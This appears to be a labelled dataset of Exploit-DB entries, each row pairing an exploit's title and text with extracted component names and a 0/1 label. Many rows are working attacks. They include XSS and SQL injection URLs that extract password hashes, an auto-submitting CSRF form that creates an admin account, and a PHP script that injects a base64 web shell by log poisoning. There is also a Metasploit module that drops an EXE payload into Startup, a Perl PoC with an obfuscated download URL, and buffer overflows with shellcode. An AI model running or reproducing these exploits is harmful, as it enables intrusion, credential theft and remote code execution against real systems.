37828,Poweradmin - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/55619/info  Poweradmin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/index.php/%3E%22%3E%3CScRiPt%3Ealert%28415833140173%29%3C/ScRiPt%3E,"[""'index.php'""]",1
48328,"Xeroneit Library Management System 3.0 - 'category' SQL Injection # Exploit Title: Xeroneit Library Management System 3.0 - 'category' SQL Injection # Google Dork: ""LMS v3.0 - Xerone IT "" # Date: 2020-04-09 # Exploit Author: Sohel Yousef jellyfish security team # Software Link: https://xeroneit.net/portfolio/library-management-system-lms # Software Demo :https://xeroneit.co/demo/lms/home/login # Version: v3.0 # Category: webapps  1. Description scritp has SQLI in books category at this dir  /lms/home/book?category_name=00*SQLI  Error Number: 1064  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0' GROUP BY `title`, `author`, `edition` ORDER BY `title` ASC LIMIT 21' at line 3  SELECT sum(cast(cast(book_info.status as char) as SIGNED)) as available_book, `book_info`.`number_of_books`, `book_info`.`id`, `book_info`.`category_id`, `book_info`.`title`, `book_info`.`size1` as `size`, `book_info`.`publishing_year`, `book_info`.`publisher`, `book_info`.`edition_year`, `book_info`.`subtitle`, `book_info`.`edition`, `book_info`.`isbn`, `book_info`.`author`, `book_info`.`cover`, `book_info`.`add_date` FROM `book_info` WHERE FIND_IN_SET('57'', category_id) !=0 AND `book_info`.`deleted` = '0' GROUP BY `title`, `author`, `edition` ORDER BY `title` ASC LIMIT 21  Filename: models/Basic.php  Line Number: 284","[""'category'""]",1
17251,"VCalendar 1.1.5 - Cross-Site Request Forgery Vulnerability ID: HTB22969 Reference: http://www.htbridge.ch/advisory/csrf_cross_site_request_forgery_in_vcalendar.html Product: VCalendar Vendor: UltraApps ( http://ultraapps.com )  Vulnerable Version: 1.1.5 Vendor Notification: 21 April 2011  Vulnerability Type: CSRF (Cross-Site Request Forgery) Risk level: Low  Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ )   Vulnerability Details: The vulnerability exists due to failure in the ""/admin/users_maint.php"" script to properly verify the source of HTTP request. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data. Attacker can use browser to exploit this vulnerability. The following PoC is available:   <form action=""http://[host]/admin/users_maint.php?ccsForm=users_maint"" method=""post"" name=""main"" /> <input type=""hidden"" name=""user_login"" value=""test""/> <input type=""hidden"" name=""user_password"" value=""test""/> <input type=""hidden"" name=""user_level"" value=""100""/> <input type=""hidden"" name=""user_email"" value=""test@test.com""/> <input type=""hidden"" name=""user_first_name"" value=""test""/> <input type=""hidden"" name=""user_last_name"" value=""test""/> <input type=""hidden"" name=""user_is_approved"" value=""1""/> <input type=""hidden"" name=""user_date_add_h"" value=""04.16.2011""/> <input type=""submit"" id=""btn"" name=""submit"" value=""Submit â€ºâ€º""> </form> <script> document.getElementById('btn').click(); </script>","['maint.php""']",1
6453,"FoT Video scripti 1.1b - 'oyun' SQL Injection **************************************************************************************  Author : By Crackers_Child Contact: cashr00t@hotmail.com Greetz : biyosecurity.com & milw0rm.com & tryag.cc & All My Friends  ************************************************************************************** Script   : FoT Video scripti V1.1 Beta  **************************************************************************************  Exploit : For username  you can read username on title  www.site.com/script_path/izle.asp?oyun=56+union+select+0,1,KULLANICIADI,3,4,5,6,7,8,9,10,11,12,13+from+KULLANICI  **************************************************************************************  Exploit : For Password(md5 hash)  you can read password on title  www.site.com/script_path/izle.asp?oyun=56+union+select+0,1,PAROLA,3,4,5,6,7,8,9,10,11,12,13+from+KULLANICI  **************************************************************************************  Administrator Path  www.site.com/script_path/yonetim_default.asp  **************************************************************************************   Dork : inurl:""izle.asp?oyun=  **************************************************************************************  N0te : Hepinizn Aq :lol **************************************************************************************  # milw0rm.com [2008-09-13]","[""'oyun'""]",1
29364,"PHP iCalendar 1.1/2.x - 'month.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/21792/info   PHP icalendar is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.    An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/phpicalendar/month.php?cal=all_calendars_combined971 &getdate=20061225""><script>alert()</script>","[""'month.php'""]",1
26180,"Land Down Under 800/801 - 'forums.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/14618/info     Land Down Under is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in SQL queries.     Successful exploitation may allow the attacker to compromise the application, retrieve sensitive information, modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/ldu/forums.php?filter=forums%2Ephp%3Fc%3Dskin&x=' http://www.example.com/ldu/forums.php?m=topics&q=3&n='  http://www.example.com/ldu/forums.php?m='&q=3&n=last  http://www.example.com/ldu/forums.php?m=topics&s='","[""'forums.php'""]",1
29228,"Vt-Forum Lite 1.3 - 'vf_newtopic.asp' IFRAME Element Cross-Site Scripting source: https://www.securityfocus.com/bid/21428/info   Vt-Forum Lite is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.    An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   The attacker may also be able to conduct HTML-injection attacks through unspecified fields on the 'vf_newtopic.asp' script page.   These issues affect version 1.3; other versions may also be vulnerable.  http://www.example.com/[scriptpath]/vf_newtopic.asp<iframe height=500 src=""http://www.example2.com/yoursite.html"">","[""'vf_newtopic.asp'"", 'IFRAME Element']",1
2573,"Comdev One Admin 4.1 - 'Adminfoot.php' Remote Code Execution #!/usr/bin/php <?php  /*********************************************************************  * Comdev One Admin 4.1 Remote Command Execution / File Inclusion Vulnerability  *   * Note:  * Requires register globals to be on, and magic quotes gpc to be off.  *  * Usage:   * php script.php [host] [path] [command]  *  * Usage Example:  * php script.php domain.com /oneadminpro/ whoami  *  * Credit:  * Synsta - Vulnerability discovery and exploit scripting  *  * File Inclusion:  * <host>/<path>/oneadmin/adminfoot.php?path[docroot]=<local/remote file>  *  * Googledork: inurl:/oneadmin/  *  * [w4ck1ng] - w4ck1ng.com  *  *********************************************************************/   if(!$argv[3 ]){ die(""Usage: php $argv[0] [host] [path] [command]\n Usage Example: php $argv[0] domain.com /dolphin/ whoami\n""); }  function send($host, $put){ global $data; $conn = fsockopen( gethostbyname($host),""80"" ); if(!$conn) { die(""Connection to $host failed...""); }else{ fputs($conn, $put); } while(!feof($conn)) { $data .=fgets( $conn); } fclose($conn); return $data; }  $host = $argv[ 1]; $path = $argv[ 2]; $cmd = $argv[ 3];  if($argv[3]){  $shellcode = base64_decode( ""PD9waHAgaWYoJF9TRVJWRVJbSFRUUF9DTURdKXsgZWNobyBjbWR4cGxzdGFydC5zaGVsbF9leGVjKHN0cmlwc2xhc2hlcygkX1NFUlZFUltIVFRQX0NNRF0pKS5jbWR4cGxlbmQ7IH0gPz4=""); $req = ""GET "". $path.""/oneadmin/adminfoot.php?path[docroot]=$shellcode HTTP/1.1\r\n""; $req .=""Accept-Encoding: text/plain\r\n"" ; $req .=""Host: "". $host.""\r\n""; $req .=""Connection: Close\r\n\r\n"" ; send(""$host"", ""$req"");  $logs = array(""../../../../../var/log/httpd/access_log"" , ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../logs/access_log"", ""../../../logs/error_log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../../../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/access_log"", ""../../../../../var/log/error_log"");  $i = 0;  foreach($logs as $value){  $logs[$i++];  $req = ""GET "". $path.""/oneadmin/adminfoot.php?path[docroot]=$logs[$i]%00 HTTP/1.1\r\n""; $req .=""CMD: $cmd\r\n""; $req .=""Accept-Encoding: text/plain\r\n"" ; $req .=""Host: "". $host.""\r\n""; $req .=""Connection: Close\r\n\r\n"" ; send(""$host"", ""$req""); print(""Trying $logs[$i]..\n"");  $adata = explode( ""cmdxplstart"",$data); $bdata = explode( ""cmdxplend"",$adata[1 ]); $cdata = $bdata[ 0];  if(eregi(""cmdxplend"",  $data)){  if($cdata==NULL){  die(""\nExploit succeeded but blank command received..\n"");  } die(""\nExploit Succeeded!\n\nCommand Resolution:\n$cdata\n"");  } } }  die(""Exploit Failed!\n""); ?>  # milw0rm.com [2006-10-16]","[""'Adminfoot.php'""]",1
47310,"SQLiteManager 1.2.0 / 1.2.4 - Blind SQL Injection <!-- # Exploit Title: Blind SQL injection in SQLiteManager 1.2.0 (and 1.2.4) # Date: 17-02-2019 # Exploit Author: Rafael Pedrero # Vendor Homepage: http://www.sqlitemanager.org/ # Software Link: http://www.sqlitemanager.org/ # Version: SQLiteManager 1.2.0 (and 1.2.4) # Tested on: All # CVE : CVE-2019-9083 # Category: webapps   1. Description  SQLiteManager 1.20 allows SQL injection via the /sqlitemanager/main.php dbsel parameter. NOTE: This product is discontinued.   2. Proof of Concept  Detect: http://localhost/sqlitemanager/main.php?dbsel=-1%20or%2072%20=%2072 http://localhost/sqlitemanager/main.php?dbsel=-1%20or%2072%20=%2070  Save the next post in a file: sqli.txt  POST /sqlite/main.php?dbsel=-1%20or%2032%20%3d%2030 HTTP/1.1 Content-Length: 191 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Cookie: PHPSESSID=s5uogfet0s4nhr81ihgmg5l4v3; SQLiteManager_currentTheme=default; SQLiteManager_currentLangue=8; SQLiteManager_fullText=0; SQLiteManager_HTMLon=0 Host: localhost Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)  action=save&ColumnList=1&ConditionList=1&trigger=&TriggerAction=FOR%20EACH%20ROW&TriggerCondition=WHEN&TriggerEvent=DELETE&TriggerMoment=BEFORE&TriggerName=kqluvanc&TriggerOn=t1&TriggerStep=1  $ python sqlmap.py -r sqli.txt -p dbsel --level 5 --risk 3 --dump-all  [11:58:27] [INFO] resuming back-end DBMS 'sqlite' [11:58:27] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: dbsel (GET)     Type: boolean-based blind     Title: OR boolean-based blind - WHERE or HAVING clause     Payload: dbsel=-4019 OR 7689=7689 --- [11:58:27] [INFO] the back-end DBMS is SQLite web server operating system: Windows web application technology: PHP X.X.X, Apache 2.X.X back-end DBMS: SQLite [11:58:27] [INFO] sqlmap will dump entries of all tables from all databases now [11:58:27] [INFO] fetching tables for database: 'SQLite_masterdb' [11:58:27] [INFO] fetching number of tables for database 'SQLite_masterdb' [11:58:27] [WARNING] reflective value(s) found and filtering out [11:58:27] [WARNING] running in a single-thread mode. Please consider usage of o ption '--threads' for faster data retrieval [11:58:27] [INFO] retrieved: 5 [11:58:27] [INFO] retrieved: database [11:58:28] [INFO] retrieved: user_function [11:58:30] [INFO] retrieved: attachment [11:58:31] [INFO] retrieved: groupes [11:58:32] [INFO] retrieved: users ..... ..... .....   3. Solution:  The product is discontinued. Update to last version. -->",['main.php '],1
18822,"PHP-decoda - 'Video Tag' Cross-Site Scripting Advisory: php-decoda: Cross-Site Scripting in Video Tags  RedTeam Pentesting discovered a cross-site scripting (XSS) vulnerability in the PHP markup parser Decoda. This allows attackers that should be restricted to the markup supported by Decoda to specify a JavaScript event handler for an iframe tag. Depending on the usage of Decoda, this allows attackers to execute JavaScript code in the context of other users in a web application that uses Decoda.   Details =======  Product: php-decoda Affected Versions: 3.x Fixed Versions: 3.3.3 Vulnerability Type: Cross-Site Scripting Security Risk: High Vendor URL: http://milesj.me/code/php/decoda Vendor Status: fixed version released Advisory URL: http://www.redteam-pentesting.de/advisories/rt-sa-2012-002 Advisory Status: published CVE: GENERIC-MAP-NOMATCH CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH   Introduction ============  Decoda is a lightweight class that extracts and parses a custom markup language; based on the concept of BB code. Decoda supports all the basic HTML tags and manages special features for making links and emails auto-clickable, using shorthand emails and links, and finally allowing the user to add their own code tags.  (from Decoda's homepage)   More Details ============  Decoda supports a directive for videos. For example the Decoda markup  [video=""youtube"" size=""small""]test[/video]  creates the following corresponding HTML code (whitespace adjusted):  <iframe src=""http://www.youtube.com/embed/test""; width=""560"" height=""315"" frameborder=""0""></iframe>  The code to generate the iframe tag can be found in the following file:  decoda/templates/video.php  There, the HTML tag is generated as follows:  <?php if ($player == 'embed') { ?>         <embed src=""<?php echo $url; ?>""                 type=""application/x-shockwave-flash""                 allowscriptaccess=""always""                 allowfullscreen=""true""                 width=""<?php echo $width; ?>""                 height=""<?php echo $height; ?>""></embed>  <?php } else { ?>         <iframe src=""<?php echo $url; ?>""                 width=""<?php echo $width; ?>""                 height=""<?php echo $height; ?>""                 frameborder=""0""></iframe>  <?php } ?>  The variable $url contains the user input provided in the video markup prefixed by the URL to YouTube. Since quotation signs provided by a user are not properly encoded, an attacker can use this to specify a JavaScript event handler that is executed when the resulting HTML document is loaded.   Proof of Concept ================  The following PHP script can be used to demonstrate this vulnerability:  <?php include '../decoda/Decoda.php'; $code = new Decoda(); $code->addFilter(new VideoFilter()); ?> <?php  $decoda_markup = '[video=""youtube"" size=""small""]""'; $decoda_markup .= 'onload=""alert(\'RedTeam Pentesting XSS\');"" id=""[/video]';  $code->reset($decoda_markup); echo $code->parse(); ?>  This results in the following output (whitespace adjusted):  <iframe src=""http://www.youtube.com/embed/""; onload=""alert('RedTeam Pentesting XSS');"" id="""" width=""560"" height=""315"" frameborder=""0""></iframe>    Workaround ==========  Disabling support for the video markup by not adding the corresponding filter might close this attack vector depending on the usage of Decoda.  Fix ===  Update to at least version 3.3.3.   Security Risk =============  The risk of the described vulnerability is considered to be high. It might be lower depending on the use case of Decoda in a web application. In case it is used in an web forum to allow formatting of postings, it can be used by attackers to completely manipulate the web page showing the respective posting by adding arbitrary content, tracking user interaction and potentially obtaining credentials from other users.   History =======  2012-03-26 Vulnerability identified 2012-04-25 Customer approved disclosure to vendor 2012-04-26 First attempt to contact vendor 2012-04-30 Vendor notified 2012-05-01 Vendor released fixed version 2012-05-02 Advisory released","[""'Video Tag'""]",1
16493,"EnjoySAP SAP GUI - ActiveX Control Arbitrary File Download (Metasploit) ## # $Id: enjoysapgui_comp_download.rb 11189 2010-12-01 03:18:05Z swtornio $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::EXE  	include Msf::Exploit::Remote::BrowserAutopwn 	autopwn_info({ 		:os_name    => OperatingSystems::WINDOWS, 		:javascript => true, 		:rank       => NormalRanking, 		:vuln_test  => nil, 	})  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'EnjoySAP SAP GUI ActiveX Control Arbitrary File Download', 			'Description'    => %q{ 					This module allows remote attackers to place arbitrary files on a users file system 				by abusing the ""Comp_Download"" method in the SAP KWEdit ActiveX Control (kwedit.dll 6400.1.1.41). 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'MC' ], 			'Version'        => '$Revision: 11189 $', 			'References'     => 				[ 					[ 'CVE', '2008-4830'], 					[ 'OSVDB', '53680'], 					[ 'URL', 'http://dsecrg.com/files/pub/pdf/HITB%20-%20Attacking%20SAP%20Users%20with%20Sapsploit.pdf' ], 				], 			'DefaultOptions' => 				{ 					'InitialAutoRunScript' => 'migrate -f', 				}, 			'Payload'        => 				{ 					'Space'           => 2048, 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Automatic', { } ], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => '??? ?? ????'))  		register_options( 			[ 				OptString.new('PATH', [ true, 'The path to place the executable.', '/../../../../../../../../Documents and Settings/All Users/Start Menu/Programs/Startup/']), 			], self.class) 	end  	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def on_request_uri(cli, request)  		payload_url =  ""http://"" 		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'] 		payload_url += "":"" + datastore['SRVPORT'] + get_resource() + ""/payload""  		if (request.uri.match(/payload/)) 			return if ((p = regenerate_payload(cli)) == nil) 			data = generate_payload_exe({ :code => p.encoded }) 			print_status(""Sending EXE payload to #{cli.peerhost}:#{cli.peerport}..."") 			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' }) 			return 		end  		vname  = rand_text_alpha(rand(100) + 1) 		exe    = rand_text_alpha(rand(20) + 1)  		content = %Q| <html> <head> 	<script> 		try { 		var #{vname} = new ActiveXObject('Kweditcontrol.KWedit.1'); 		#{vname}.Comp_Download(""#{payload_url}"",""#{datastore['PATH']}/#{exe}.exe""); 		} catch( e ) { window.location = 'about:blank' ; } 	</script> </head> </html> 				|  		print_status(""Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}..."")  		send_response_html(cli, content)  		handler(cli)  	end  end",['kwedit.dll '],1
20870,"Express Burn Plus 4.58 - EBP Project File Handling Buffer Overflow (PoC) #!/usr/bin/perl # # # Express Burn Plus v4.58 EBP Project File Handling Buffer Overflow PoC # # # Vendor: NCH Software # Product web page: http://www.nchsoftware.com # Affected version: 4.58 # # Summary: Express Burn is a program that allows you to create and copy many # kinds of disc media, including Audio (audio CDs / .mp3 CDs), Video (DVDs), # and Data (CDs / DVDs / Blu-ray). # # Desc: The vulnerability is caused due to a boundary error in the processing # of a project file, which can be exploited to cause a unicode buffer overflow # when a user opens e.g. a specially crafted .EBP file. Successful exploitation # could allow execution of arbitrary code on the affected machine. # # # =========================================================================== # # (13d4.a84): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # eax=050a8c70 ebx=004034fc ecx=00000041 edx=fc4d5390 esi=0157cf68 edi=001297fe # eip=004678ef esp=00126420 ebp=001274c0 iopl=0         nv up ei pl nz na pe nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 # *** WARNING: Unable to verify checksum for image00400000 # *** ERROR: Module load completed but symbols could not be loaded for image00400000 # image00400000+0x678ef: # 004678ef 66890c02        mov     word ptr [edx+eax],cx    ds:0023:0157e000=???? # 0:000> d eax # 050a8c70  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8c80  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8c90  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8ca0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8cb0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8cc0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8cd0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8ce0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0:000> d esi # 0157cf68  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cf78  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cf88  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cf98  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cfa8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cfb8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cfc8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cfd8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # # =========================================================================== # # # Tested on: Microsoft Windows 7 Ultimate SP1 EN # # # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic #                             Zero Science Lab - http://www.zeroscience.mk # # # Advisory ID: ZSL-2012-5103 # Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5103.php # # # 25.08.2012 #  use Cwd; use LWP::Simple;  print ""\n         #=---===---===---===---===---===---===---===---=#         |                                               |         |          Proof Of Concept script for          |         |                                               |         |     NCH Software Express Burn Plus v4.58      |         |                                               |         |                                               |         |               ID: ZSL-2012-5103               |         |                                               |         |                      ---                      |         |                                               |         |               Copyleft (c) 2012               |         |                                               |         |  Zero Science Lab - http://www.zeroscience.mk |         |                                               |         #=---===---===---===---===---===---===---===---=#         \n"";  $file = ""Exploit.EBP"";  $zoom = substr("")aZh4/"",3,1).substr(""^7ttr"",2,2).substr(""p>eErZ"",0,1).         substr(""7U:/.9"",2,2).substr(""v/!+T"",1,1).substr(""oL4z55"",3,1).         substr(""erY3%"",0,2).substr(""8oscW1"",1,3).substr(""iLien@"",2,3).         substr(""*hJ2ce"",4,2).substr(""6.#h1A"",1,1).substr(""mk-(("",0,2).         substr("">/cZo"",1,2).substr(""[Mood]4"",3,2).substr(""lesS?"",1,2).         substr(""a*\@J/b"",4,2).substr(""lue8X"",0,3).substr(""fish6"",0,4).         substr("",,8Y.b"",4,1).substr(""GrUmp!"",3,2).substr(""1337:"",2,1);          print ""\n\n\x20\x20\x1A Creating malicious project file...\n\n"";         $decoy = ""440Hz.mp3"";         getstore($zoom, $decoy);         print ""\x20\x20\x1A Throwing decoy file: $decoy...\n"";         $buffer = ""\x41\x41\x41\x41"" x (15000/2);         $dir = getcwd;         $dir =~ s/\//\\/g;  $load = ""<?xml version=\""1.0\""?>\<ExpressBurnProject type=\""0\""><Alb"".         ""umTitle/><TrackList><Audiotrack file=\""$dir\\$decoy\"" title"".         ""=\""$buffer\"" artist=\""Salvador\""/></TrackList>\r</ExpressBu"".         ""rnProject>\r"";          open fp, "">./$file"" || die ""\n[-] Can't open $file: $!\n\n"";         print fp $load; close fp;         print ""\n\x20\x20\x19 File created successfully: $file "";         $file = -s $file; print ""($file bytes).\n\n\n"";  ##EOF",['EBP'],0
25272,Dream4 Koobi CMS 4.2.3 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/12895/info  Koobi CMS is reportedly affected by a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/index.php?area=[XSS],"[""'index.php'""]",1
39417,"FTPShell Client 5.24 - 'Create NewFolder' Local Buffer Overflow #[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+] #[+] Exploit Title: FTPShell Client (Add New Folder) Local Buffer Overflow #[+] Date: 2/2/2016 #[+]Exploit Author: Arash Khazaei #[+] Vendor Homepage: www.ftpshell.com #[+]Software Link: http://www.ftpshell.com/download.htm #[+] Version: 5.24 #[+] Tested on: Windows XP Professional SP3 (Version 2002) #[+] CVE : N/A #[+] introduction : Add New Folder In Remote FTP Server And In Name Input Copy Buffer.txt File content  #[+] or click on Remote Tab Then Click On Create Folder And Copy Buffer.txt In Name Input ... #[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]  #!/usr/bin/python filename = ""buffer.txt"" # Junk A junk = ""A""*452 #77FAB277  JMP ESP # Windows Xp Professional Version 2002 Service Pack 3 eip = ""\x77\xB2\xFA\x77"" # Nops nops = ""\x90""*100 # Shellcode Calc.exe 16Byte buf=(""\x31\xC9"" ""\x51""     ""\x68\x63\x61\x6C\x63""     ""\x54""     ""\xB8\xC7\x93\xC2\x77""     ""\xFF\xD0"")  #Appending Buffers Together exploit = junk + eip + nops + buf #Creating File length = len(exploit) print ""[+]File name:     [%s]\n"" % filename print ""[+]Payload Size: [%s]\n "" % length  print ""[+]File Created.\n""  file = open(filename,""w"") file.write(exploit) file.close print exploit   #[+] Very Special Tnx To My Best Friends: TheNonexistent,Nirex,Pr0t3ctor","[""'Create""]",0
27079,Web Host Automation Ltd. Helm 3.2.8 - 'ForgotPassword.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/16234/info  Helm is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 3.2.8 is reported vulnerable; other versions may also be affected.  http://www.example.com/forgotPassword.asp?txtEmailAddress=[XSS],"[""'ForgotPassword.asp'""]",1
19359,"Microsoft Windows NT 4.0/SP1/SP2/SP3/SP4 / NT 3.5.1/SP1/SP2/SP3/SP4/SP5 - Screensaver source: https://www.securityfocus.com/bid/474/info  When the computer is idle for the set time period (user definable) Winlogon.exe starts the screensaver. The screen saver process is selectable by the user. Winlogon.exe uses the CreateProcessAPI call to start the screen saver and immediately suspends it. At this point the screen saver is running with the security context of Winlogon.exe (system). Winlogon obtains the process handle, changes the primary security token of the screen saver to match the current user, and resumes the screen saver. Winlogon never verifies that the token change was successful. Therefore, a user could create an executable, set it as the screen saver, and should the security change fail it will run with full system-level privileges.   This exploit and description provided by Cybermedia Software Private Limited.  The simulation consists of one 32-bit application say BEADMIN.EXE and one MS-DOS based application, say SCRNSAVE.EXE. The BEADMIN.EXE when started does the following Creates one event in â??not-signalâ??ed state Sets up the screen saver. The screen saver executable is specified as SCRNSAVE.EXE and the timeout is set to minimum. . BEADMIN.EXE now waits on the event. After some time, the screen saver is triggered. This results in Winlogon.Exe spawning SCRNSAVE.EXE. Since the CreateProcess call returns junk handle to Winlogon.Exe, the setting of primary token fails. Hence the SCRNSAVE.EXE application (NTVDM.EXE) runs in System Context. This SCRNSAVE.EXE again spawns BEADMIN.EXE application. Now this second copy of BEADMIN.EXE inherits the security context of NTVDM which is System Context. This application adds the logged in user to admin group and signals the event on which first instance of BEADMIN.EXE is waiting. In response to this the first copy of BEADMIN.EXE resets back the Screen Saver settings and quits. The logged in user name is passed between the first and second copy of BEADMIN.EXE using shared section.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19359.zip","['Winlogon.exe', 'SCRNSAVE.EXE']",1
22282,WihPhoto 0.86 dev - 'sendphoto.php' File Disclosure source: https://www.securityfocus.com/bid/6929/info  A vulnerability has been reported for WihPhoto that may result in the disclosure of files to remote attackers.  The vulnerability exists due to inadequate verification of some URI parameters in the sendphoto.php script file.  An attacker can exploit this vulnerability and specify arbitrary files as the parameters to the variables. This will cause WihPhoto to send an email with the attacker-specified file as an attachment.    http://www.example.org/sendphoto.php?album=..&pic=config.inc.php http://www.example.org/sendphoto.php?album=..&pic=config.inc.php&sendto=[E-MAIL]&filled=1,"[""'sendphoto.php'""]",1
33691,Comptel Provisioning and Activation - 'index.jsp?error_msg_parameter' Cross-Site Scripting source: https://www.securityfocus.com/bid/38534/info  Comptel Provisioning and Activation is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  http://www.example.com/sas5/index.jsp?error_msg_parameter=%3CScRiPt%3Ealert%28%27XSS%27%29%3C/ScRiPt%3E,"[""'index.jsp?error_msg_parameter'""]",1
